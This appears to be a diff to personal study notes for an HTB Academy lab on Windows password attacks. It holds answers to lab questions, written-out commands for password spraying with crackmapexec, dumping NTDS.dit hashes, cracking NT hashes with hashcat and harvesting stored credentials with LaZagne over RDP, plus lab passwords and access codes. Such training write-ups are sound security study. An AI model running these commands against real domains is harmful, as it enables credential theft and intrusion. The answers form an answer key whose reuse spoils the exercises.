@@ -316,9 +316,125 @@ Then we can crack the NT Hash with Hashcat
 
 Attacking using crackmapexec
 
+#### Questions
 
+**What is the name of the file stored on a domain controller that contains the password hashes of all domain accounts? (Format: \*\*.\*)**
+
+* ntds.dit
+
+**Submit the NT hash associated with the Administrator user from the example output in the section reading.**
+
+<figure><img src=".gitbook/assets/image (324).png" alt=""><figcaption></figcaption></figure>
+
+* 64f12cddaa88057e06a81b54e73b949b
+
+**On an engagement you have gone on several social media sites and found the Inlanefreight employee names: John Marston IT Director, Carol Johnson Financial Controller and Jennifer Stapleton Logistics Manager. You decide to use these names to conduct your password attacks against the target domain controller. Submit John Marston's credentials as the answer. (Format: username:password, Case-Sensitive)**
+
+* `git clone` [`https://github.com/urbanadventurer/username-anarchy.git`](https://github.com/urbanadventurer/username-anarchy.git)
+* nano usernames.txt
+*
+
+    <figure><img src=".gitbook/assets/image (325).png" alt=""><figcaption></figcaption></figure>
+
+
+* ./username-anarchy -i /home/zihuatanejo/HTB\_local/Academy/AD/usernames.txt
+*
+
+    <figure><img src=".gitbook/assets/image (326).png" alt=""><figcaption></figcaption></figure>
+
+
+* `poetry run crackmapexec smb 10.129.202.85 -u jmarston -p /usr/share/wordlists/fasttrack.txt`
+
+<figure><img src=".gitbook/assets/image (327).png" alt=""><figcaption></figcaption></figure>
+
+
+
+* jmarston:P@ssword!
+
+**Capture the NTDS.dit file and dump the hashes. Use the techniques taught in this section to crack Jennifer Stapleton's password. Submit her clear-text password as the answer. (Format: Case-Sensitive)**
+
+* `poetry run crackmapexec smb 10.129.202.85 -u jmarston -p P@ssword! --ntds`
+*
+
+    <figure><img src=".gitbook/assets/image (328).png" alt=""><figcaption></figcaption></figure>
+
+
+*
+
+    <figure><img src=".gitbook/assets/image (329).png" alt=""><figcaption></figcaption></figure>
+
+
+* `sudo hashcat -m 1000 92fd67fd2f49d0e83744aa82363f021b /home/z`
+* `ihuatanejo/Desktop/rockyou.txt`
+
+<figure><img src=".gitbook/assets/image (330).png" alt=""><figcaption></figcaption></figure>
+
+* Winter2008
 
 ### Credential Hunting in Windows
+
+#### Questions
+
+**What password does Bob use to connect to the Switches via SSH? (Format: Case-Sensitive)**
+
+* xfreerdp /v:10.129.177.167 /u:BOB /p:HTB\_@cademy\_stdnt!
+  * or Reminna
+* Attack host: download Lazagne.exe (portable release)
+
+<figure><img src=".gitbook/assets/image (331).png" alt=""><figcaption></figcaption></figure>
+
+* copy Lazagne.exe to Win target machine
+  * `xfreerdp /v:10.129.177.167 /u:BOB /p:HTB_@cademy_stdnt! /dynamic-resolution /drive:/home/zihuatanejo/Desktop/Tools`
+  *
+
+      <figure><img src=".gitbook/assets/image (332).png" alt=""><figcaption></figcaption></figure>
+
+      <figure><img src=".gitbook/assets/image (333).png" alt=""><figcaption></figcaption></figure>
+* Run LaZagne.exe
+  * `start LaZagne.exe all -oA -output C:\Users\bob\Desktop`
+
+<figure><img src=".gitbook/assets/image (334).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src=".gitbook/assets/image (335).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src=".gitbook/assets/image (337).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src=".gitbook/assets/image (338).png" alt=""><figcaption></figcaption></figure>
+
+* WellConnected123
+
+**What is the GitLab access code Bob uses? (Format: Case-Sensitive)**
+
+* Desktop - WorkStuff - GitlabAccessCodeJustIncase
+
+<figure><img src=".gitbook/assets/image (339).png" alt=""><figcaption></figcaption></figure>
+
+* 3z1ePfGbjWPsTfCsZfjy
+
+**What credentials does Bob use with WinSCP to connect to the file server? (Format: username:password, Case-Sensitive)**
+
+<figure><img src=".gitbook/assets/image (336).png" alt=""><figcaption></figcaption></figure>
+
+
+
+* LaZagne.exe above...
+* ubuntu:FSadmin123
+
+**What is the default password of every newly created Inlanefreight Domain user account? (Format: Case-Sensitive)**
+
+* ThisPC - C - Automations\&Scripts - BulkaddADusers
+
+<figure><img src=".gitbook/assets/image (340).png" alt=""><figcaption></figcaption></figure>
+
+* Inlanefreightisgreat2022
+
+**What are the credentials to access the Edge-Router? (Format: username:password, Case-Sensitive)**
+
+* ThisPC - C - Automations\&Scripts - Scripts - EdgeRouterConfigs
+
+<figure><img src=".gitbook/assets/image (341).png" alt=""><figcaption></figcaption></figure>
+
+* edgeadmin:Edge@dmin123!
 
 ## Linux Local PW Attacks
 
